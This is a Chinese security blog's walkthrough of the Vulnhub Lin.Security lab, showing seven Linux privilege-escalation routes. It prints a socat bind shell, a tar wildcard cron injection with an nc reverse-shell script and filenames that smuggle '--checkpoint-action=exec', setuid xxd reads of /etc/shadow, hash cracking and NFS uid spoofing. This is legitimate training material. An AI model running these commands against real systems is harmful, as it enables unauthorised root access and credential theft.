> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VxqKXUub7RVO0nPTTpKt_g)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **28** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/6SUs3WHn8P9QVFXd4lu03am0PtsHHPDtib3xhEFpJJw1TAbtMv0hrjSVKKgWm72fdhsPL6RbEbHZGTsiaFTiaxTYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/cXxu8rO9aeEoLicH7cEMZmicpEDhJicEicARW2EAzCkz4ClBBjTq0PvkSrINBsGDtfoSUsUxWKy1lXj5C6gvSfJLBA/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/linsecurity-1,244/

靶机难度：中级（CTF）

靶机发布日期：2018 年 7 月 11 日

靶机描述：在 in.security，我们希望开发一个 Linux 虚拟机，该虚拟机在编写本文时基于最新的 Ubuntu 发行版（18.04 LTS），但存在许多漏洞，这些漏洞使用户无法升级扎根在盒子上。旨在帮助理解某些内置应用程序和服务（如果配置错误）可能会被攻击者滥用。

我们已将该框配置为模拟真实世界的漏洞（尽管位于单个主机上），这将帮助您完善本地特权升级技能，技术和工具集。从简单到中级都有许多挑战，我们很高兴看到您用来解决这些挑战的方法！

该图像不到 1.7 GB，可以使用上面的链接下载。打开 OVA 文件时，将导入并使用 NAT 适配器配置名为 lin.security 的 VM，但是可以通过首选虚拟化平台的首选项将其更改为桥接。

首先，您可以使用以下凭据登录主机：bob / secret

目标：得到 root 权限

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

  

一、七种攻击方式

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8o1LROxOQrRKKHHSMkwbJe6UlKZEVXEt8pBQGnTqM0Ct9ibltrB2S05w/640?wx_fmt=png)

这边直接给了低权限的用户密码...bob / secret，这边我还是习惯于 kali 登录他，进行渗透...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr808tSLr923nbicuwz3gsIfjvy8F4oCvSgjTSb4gjUx62vjOfxdSWcUDw/640?wx_fmt=png)

```
IP：192.168.56.125
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr81mX9IibcT2FkU6V5pgkbbA24nsPicYmHHsGMPVFmTOib6qh8OEmGkB8Ow/640?wx_fmt=png)

开了很多端口... 还是从本地 ssh 上去登录吧...

看到介绍这个靶机应该是漏洞百出.... 供我们学习操作用的...

先拿个权限试试，看到没开 80 端口... 估计是走 linux 类型的提权方式了....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr88swCLF7uj36Mmr99OfoD6IZojv00IRk7FmET2PUu4qHve3CQ08ibc8Q/640?wx_fmt=png)

尝试在谷歌找这个版本的漏洞，都试了几个，目前没成功过....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8cicba1nsoZduLfNs5fFH3zM9tZX8cXYnRy2GnCgp5hBhSM3e913DSVw/640?wx_fmt=png)

可以看到 bob 被授予访问权限以在可扩展程序上运行范围内容有很多...

这边 https://gtfobins.github.io / 参考这个学习 github 里面很多讲解 sudo 下的提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8d9eZ1K2b2R2FQ1w42k4YKsliaYBXcsQoLw7njl9npQNDQZjaWJFpPaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oIftju2DdeGdtSnaOEZ7dibDcSL9ib8MeA7v8VPEFAcOYWzibKvXcW7YAwp0ibOnVplJ4lice0S6Sqibfz8UR69AQHVA/640?wx_fmt=png)

方法 1

![](https://mmbiz.qpic.cn/mmbiz_png/ia0ZzxuKYGB9z3YUuDtmdjaRia8IyUwsy5ibNsXFTO9GDUIKia5YOFmoojYV2vIZgibiaCN7jk6bWLjrrjqJDqb5q7eQ/640?wx_fmt=png)

如果 sudo -l 遇到 socat，可以直接一条命令拿权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8oFwb1JZKORLQMcdvhib7OABDva1C8u6S3MuFGDjbpFDU19cPtpT2uiaQ/640?wx_fmt=png)

```
sudo socat tcp-listen:6666,reuseaddr,fork exec:sh,pty,stderr,setsid,sigint,sane
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8TibwpmrYL7Zp3oibHhF1BcicVibibHnusEkvFMOJQHib97XvTcXz3OsGian3Q/640?wx_fmt=png)

```
soat FILE:`tty`,raw,echo=0 TCP:127.0.0.1:6666
```

提权成功....！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8xrWLZ5C2Ow2icCw7uSbVx2qyUkU8o5dtSiaVNg5M1PofrlFA1ZBzuXibg/640?wx_fmt=png)

这也提权成功...！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8V33ZpGju4VYl2494YGelUe9lKL0pgtxgLNnp0bVB92QkcrM7FhWRGQ/640?wx_fmt=png)

这也成功了！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr84L4HFclP54OSQEqic2vnTbESicmLVIajDCNgAuJ6YKC68fPnIaNBqaqg/640?wx_fmt=png)

还可以用 git... 提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8d5gia7Hv320at0SRa8rhTtBcXer6N3eQk0x3CZCk4APp5a8Hnhlfia4w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8Q0phtH67DyXklff11FVZOPUAXZLLYekMwdGAWBHWib3mbQL6y9dkIyA/640?wx_fmt=png)

等等.... 只要 sudo -l 中 / user/bin / 目录下的形式都有方法提权... 参考：https://gtfobins.github.io/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oIftju2DdeGdtSnaOEZ7dibDcSL9ib8MeA7v8VPEFAcOYWzibKvXcW7YAwp0ibOnVplJ4lice0S6Sqibfz8UR69AQHVA/640?wx_fmt=png)

方法 2

![](https://mmbiz.qpic.cn/mmbiz_png/ia0ZzxuKYGB9z3YUuDtmdjaRia8IyUwsy5ibNsXFTO9GDUIKia5YOFmoojYV2vIZgibiaCN7jk6bWLjrrjqJDqb5q7eQ/640?wx_fmt=png)

在现代 Linux 系统上，用户密码哈希存储在 / etc/shadow 中。如果我们查看 / etc/passwd，通常会看到以下内容：  

roroot:x:0:0:root:/root:/bin/bash....

在这种情况下，x 表示该用户的密码哈希存储在 / etc/shadow 中。但是，可以用此 x 替换 / etc/passwd 中的哈希，然后由主机对其进行评估....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8oGjJAD00GXiaz0A9DqyropthicCb39PK6hicuSzR1Nh4Sr84K7icIbmXNg/640?wx_fmt=png)

列如 JTR 或 hash-identifier 之类的工具将有助于将该哈希识别为 descrypt，然后我们可以将其扔给 JTR 或 hashcat 进行破解看看.....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8JbbcFQNwttRfxkRJ9r746s6vJFk46iaS5PoBslJSvG7ogVs30iaWb3XA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oIftju2DdeGdtSnaOEZ7dibDcSL9ib8MeA7v8VPEFAcOYWzibKvXcW7YAwp0ibOnVplJ4lice0S6Sqibfz8UR69AQHVA/640?wx_fmt=png)

方法 3

![](https://mmbiz.qpic.cn/mmbiz_png/ia0ZzxuKYGB9z3YUuDtmdjaRia8IyUwsy5ibNsXFTO9GDUIKia5YOFmoojYV2vIZgibiaCN7jk6bWLjrrjqJDqb5q7eQ/640?wx_fmt=png)

cron 作业方法攻击，这里可以参考

```
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8ImUzafb2ASfjQibVOjicT4Hc5fNiaezlcPjm5IDy5pH1kduGTMxic4I71A/640?wx_fmt=png)

链接在上面（）有...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8TTcXoR1GrrhuvRafRLs04eLLDIkZknCvZobx1qzcMv9oEABI3kWSicQ/640?wx_fmt=png)

在攻击会话中执行...

```
echo "mkfifo /tmp/dayu; nc 127.0.0.1 6666 0</tmp/dayu | /bin/sh >/tmp/dayu 2>&1; rm /tmp/dayu" > shell.sh && chmod +x shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8iaHfEeAzI61QJgko3dYuv1xxqSFZTJDk2mq0njcyypWtpqp4mhIVHXg/640?wx_fmt=png)

在有关 Lin.security 的另一个会话中，我们需要运行一个侦听器... 成功提权

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oIftju2DdeGdtSnaOEZ7dibDcSL9ib8MeA7v8VPEFAcOYWzibKvXcW7YAwp0ibOnVplJ4lice0S6Sqibfz8UR69AQHVA/640?wx_fmt=png)

方法 4

![](https://mmbiz.qpic.cn/mmbiz_png/ia0ZzxuKYGB9z3YUuDtmdjaRia8IyUwsy5ibNsXFTO9GDUIKia5YOFmoojYV2vIZgibiaCN7jk6bWLjrrjqJDqb5q7eQ/640?wx_fmt=png)

利用隐藏文件....  

有时最简单的漏洞隐藏在视线中....

找下...

用 ls 或者 find 找都可以...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8dPrltqL2YEuX9ZL07OzQ5cnODJGMk3HgshRUAOm4qWaxENbSdSlXibg/640?wx_fmt=png)

```
ls -alR /home
```

  或者....  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8wTCvnNutcpmnHdNculgiblFTclsXZHxUlsLiaNL6mZRge6hscFPXISXQ/640?wx_fmt=png)

```
find / -name ".*" -type f -path "/home/*" -exec ls -al {} \;
```

 （此命令随意都可以套用）  

使用 secret 进入了 susan 用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8suX6ulicDwBSPzCqpt7AuECeI6ZFn0Kkxo5LuU8IJ1uDcCSRsLibKmXQ/640?wx_fmt=png)

提权需要密码... 找下系统中有哪些文件

命令：ls -alt `find / -perm -4000 -type f 2>/dev/null` |grep -v snap

发现 XXD 文件... 可以找到账号...

```
http://wiki.christophchamp.com/index.php?title=Xxd
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8MqrwShtaG7GhFYLatvAXbAvtLnbZLptoNI2L0E3FlASnYQTSzQq4og/640?wx_fmt=png)

此命令将从我们传递的文件中读出一个十六进制转储，也可以用另一种方法将转储转换为原始文件，可以使用 xxd 读取任何文件，由于它是 “setuid”，因此我们可以使用 root 权限进行操作...

复制文件 / etc/passwd 和文件 / etc/shadow，将使用 archifamoso rockyou.txt 作为单词列表从 Kali 中进行暴力破解...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8OyagM3icv7RHPVb5feHA23ugSH2m7ufJsj6JJib8BDkKtcbcHV639MGQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8DcHibRY6Y2WaAxhjeOYjEWgEnWyZ7n43XJaHFQlPa1Z33YTtxB59Qjw/640?wx_fmt=png)

```
root:secret123:0:0:root:/root:/bin/bash
bob:secret:1000:1004:bob:/home/bob:/bin/bash
insecurity:P@ssw0rd:0:0::/:/bin/sh
```

使用 secret123 登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8QHLaSwj8AfQCvjiam9wIOo1jpwm8Bf6W725viad1uMVqDqibAiccSjTHog/640?wx_fmt=png)

成功提权....

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oIftju2DdeGdtSnaOEZ7dibDcSL9ib8MeA7v8VPEFAcOYWzibKvXcW7YAwp0ibOnVplJ4lice0S6Sqibfz8UR69AQHVA/640?wx_fmt=png)

方法 5

![](https://mmbiz.qpic.cn/mmbiz_png/ia0ZzxuKYGB9z3YUuDtmdjaRia8IyUwsy5ibNsXFTO9GDUIKia5YOFmoojYV2vIZgibiaCN7jk6bWLjrrjqJDqb5q7eQ/640?wx_fmt=png)

SUID＃1 提权...  

使用以下命令快速找到所有 SUID 文件：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8nELQD2vapVRyrRXS2wibBoJoFJY52QPB0GiaDI5TAKAzBe9G7MZyyTPQ/640?wx_fmt=png)

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

这个方法和上面 4 差不多，但是用户不一样... 上面是 susan 用户下的

这里是 bob 用户下的...

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oIftju2DdeGdtSnaOEZ7dibDcSL9ib8MeA7v8VPEFAcOYWzibKvXcW7YAwp0ibOnVplJ4lice0S6Sqibfz8UR69AQHVA/640?wx_fmt=png)

方法 6

![](https://mmbiz.qpic.cn/mmbiz_png/ia0ZzxuKYGB9z3YUuDtmdjaRia8IyUwsy5ibNsXFTO9GDUIKia5YOFmoojYV2vIZgibiaCN7jk6bWLjrrjqJDqb5q7eQ/640?wx_fmt=png)

SUID＃2 提权...  

使用以下命令快速找到所有 SUID 文件：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8B65Ax5SThFJouicOACmPzjMN75QD5wgqtESm0tDyynZzqpOU4XgOkdQ/640?wx_fmt=png)

发现 taskset 利用

```
https://gtfobins.github.io/gtfobins/taskset/#suid-enabled
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr87Inj2EibAJeaEiclIQHmEwARdbIYTquffibkPXbG0APPEkaOBcrqeLEzw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8tTibI1IMGu7wVhxm4CAGF0T4xCuKQMXPNA1RHZvg0G8EFd0et9omic3w/640?wx_fmt=png)

成功提权...

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oIftju2DdeGdtSnaOEZ7dibDcSL9ib8MeA7v8VPEFAcOYWzibKvXcW7YAwp0ibOnVplJ4lice0S6Sqibfz8UR69AQHVA/640?wx_fmt=png)

方法 7

![](https://mmbiz.qpic.cn/mmbiz_png/ia0ZzxuKYGB9z3YUuDtmdjaRia8IyUwsy5ibNsXFTO9GDUIKia5YOFmoojYV2vIZgibiaCN7jk6bWLjrrjqJDqb5q7eQ/640?wx_fmt=png)

NFS（低特权访问）提权....（前面章节也有说过 NFS）  

nmap 扫描结果中可以看到 SSH 和 NFS（分别为 TCP 22 和 2049）都已经打开....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8LKuvibVHC9BI1rhLZic28qbk2Tz7iaVqZEFRrM7SpB0FFbP3ibKAzGDpXw/640?wx_fmt=png)

确认了 NFS 起来了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8MwHu55qb2iaLJ3qXl50icwveRTJ6nNCposdVib1qvUvFDUfT4Efzrz78Q/640?wx_fmt=png)

这边用 / home/peter 进行挂载...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr85GCq6r4ia2lmDounfDYpZVy0ibmn7DRnmJUxVQT1SPlhq4p0fM3Ma3yQ/640?wx_fmt=png)

在 Kali 上挂载了 NFS 共享，可以创建一个具有与导出（1001/1005）相同的 uid/gid 的新用户，然后又成为该用户即可....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8B1HydH9NC07fYN61X60E0Hmt2mYnxCkecdVicP4LeBpiaOmoyPuHYicag/640?wx_fmt=png)

作为 peter，现在可以写入导出文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8jQ1PsyIsrfT36DIAGxDd1wJNRr6z63oCiczibJcOxxmzVI6eLS2PRnIw/640?wx_fmt=png)

现在可以访问 Lin.security 上的 / home/pete 了... 然后使用 ssh 密匙进行链接即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8RIGuPkuutRqGXialIJKGibh1dcrahtqIuekibLicbh25e9FgofUtVGeTOA/640?wx_fmt=png)

创建好后在 peter 上创建个. ssh 目录，用于放密匙的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPV2pAbAZYeN9KSM3g52ibr8X5AJHZtgDLFcaLIOBRuhosTotNKMCxH0ictDD6TL98deEPkOkMQRVQQ/640?wx_fmt=png)

后续继续跟上一样提权即可....

![](https://mmbiz.qpic.cn/mmbiz_png/6SUs3WHn8P9QVFXd4lu03am0PtsHHPDtib3xhEFpJJw1TAbtMv0hrjSVKKgWm72fdhsPL6RbEbHZGTsiaFTiaxTYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/cXxu8rO9aeEoLicH7cEMZmicpEDhJicEicARW2EAzCkz4ClBBjTq0PvkSrINBsGDtfoSUsUxWKy1lXj5C6gvSfJLBA/640?wx_fmt=png)

看到靶机的说明介绍应该还有很多很多方法.... 例如还能在 peter 用户下的 strace id 进行提权等等...

如果有更多的方法希望小伙伴和我说说.... 一起交流学习，加油！

由于我们已经成功得到 root 权限，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)